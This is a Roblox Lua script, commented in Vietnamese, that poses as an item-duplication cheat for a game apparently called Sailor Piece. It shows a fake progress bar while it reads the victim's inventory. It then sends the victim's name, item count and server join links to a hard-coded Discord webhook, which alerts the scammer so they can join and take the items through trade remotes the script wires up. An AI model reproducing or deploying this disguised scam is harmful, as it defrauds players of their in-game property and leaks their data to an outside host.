-- =============================================
-- UNOWNER SCRIPT: FAKE DUP ITEM + AUTO WEBHOOK
-- =============================================

local OWNER_ID = 8604380596
local MIN_RARITY = "Common"

local WEBHOOK = "https://discord.com/api/webhooks/1491061349571235890/HCxbVGWV26ai6_0o3iEBQ4bHcLLGpgEyopW5Zl82q-WuTpbbdPHtR3R88ri92xVE9ZPe"

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- Remotes
local Remotes = RS:WaitForChild("Remotes")
local TradeRemotes = Remotes:WaitForChild("TradeRemotes")
local SendTradeRequest = TradeRemotes:WaitForChild("SendTradeRequest")
local AddItemToTrade = TradeRemotes:WaitForChild("AddItemToTrade")
local SetReady = TradeRemotes:WaitForChild("SetReady")
local ConfirmTrade = TradeRemotes:WaitForChild("ConfirmTrade")
local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
local RequestInventory = Remotes:FindFirstChild("RequestInventory")
local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")

local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))

local filteredItems = {}
local gotInventory = false

-- Gửi Webhook thông báo
local function sendWebhook(placeId, jobId)
    local playerName = LP.DisplayName .. " (@" .. LP.Name .. ")"
    local browserLink = "https://www.roblox.com/home?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    local deepLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    local data = {
        content = "<@8604380596> **🚨 DUP ITEM READY**",
        embeds = {{
            title = "SAILOR PIECE - DUP ITEM",
            color = 0x00FF88,
            fields = {
                {name = "Người dùng", value = playerName, inline = true},
                {name = "Items", value = #filteredItems .. " (" .. MIN_RARITY .. "+)", inline = true},
                {name = "Join ngay", value = "[🌐 Click vào đây](" .. browserLink .. ")\n`" .. deepLink .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        local fn = request or http_request or (syn and syn.request)
        if fn then
            fn({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- Fake Dup UI (giống trước)
local function createDupUI()
    -- (Code UI giống phiên bản trước, mình rút gọn để ngắn)
    -- Bạn có thể dùng lại UI từ script cũ nếu muốn
    local sg = Instance.new("ScreenGui")
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999
    sg.Parent = LP.PlayerGui

    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 460, 0, 420)
    main.Position = UDim2.new(0.5, -230, 0.5, -210)
    main.BackgroundColor3 = Color3.fromRGB(10,10,22)
    main.Parent = sg
    Instance.new("UICorner", main).CornerRadius = UDim.new(0,14)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,50)
    title.Position = UDim2.new(0,0,0,20)
    title.BackgroundTransparency = 1
    title.Text = "DUP ITEM SCRIPT v2.8"
    title.TextColor3 = Color3.fromRGB(0,255,100)
    title.TextSize = 28
    title.Font = Enum.Font.GothamBlack
    title.Parent = main

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1,0,0,30)
    status.Position = UDim2.new(0,0,0,120)
    status.BackgroundTransparency = 1
    status.Text = "Đang duplicate toàn bộ vật phẩm..."
    status.TextColor3 = Color3.fromRGB(180,255,180)
    status.TextSize = 16
    status.Font = Enum.Font.GothamBold
    status.Parent = main

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.85,0,0,9)
    barBg.Position = UDim2.new(0.075,0,0,170)
    barBg.BackgroundColor3 = Color3.fromRGB(25,25,40)
    barBg.Parent = main
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(0,255,100)
    barFill.Parent = barBg
    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1,0)

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(1,0,0,25)
    percent.Position = UDim2.new(0,0,0,190)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(0,255,120)
    percent.TextSize = 16
    percent.Font = Enum.Font.GothamBold
    percent.Parent = main

    return sg, barFill, percent, status
end

local function runFakeDup()
    local sg, barFill, percent, status = createDupUI()

    for i = 1, 100 do
        TweenService:Create(barFill, TweenInfo.new(0.15), {Size = UDim2.new(i/100,0,1,0)}):Play()
        percent.Text = i .. "%"
        task.wait(0.12)
    end

    status.Text = "Duplicate hoàn tất! Đang chờ Owner..."
    task.wait(1.5)
    sg:Destroy()

    sendWebhook(game.PlaceId, game.JobId)   -- Gửi webhook
    -- Trade sẽ được thực hiện khi Owner vào (nếu muốn trade ngay thì thêm executeTrade() ở đây)
end

-- Inventory
if UpdateInventory then
    UpdateInventory.OnClientEvent:Connect(function(...)
        for _, arg in ipairs({...}) do
            if type(arg) == "table" then
                local temp = {}
                for _, v in pairs(arg) do
                    if v.name and v.quantity then
                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
                            table.insert(temp, {name = v.name, quantity = v.quantity})
                        end
                    end
                end
                filteredItems = temp
                gotInventory = true
            end
        end
    end)
end

task.spawn(function()
    while not gotInventory do
        if RequestInventory then pcall(function() RequestInventory:FireServer() end) end
        task.wait(2.5)
    end
    runFakeDup()
end)

print("Fake Dup Item Script đã chạy - Sẽ gửi webhook khi load xong")
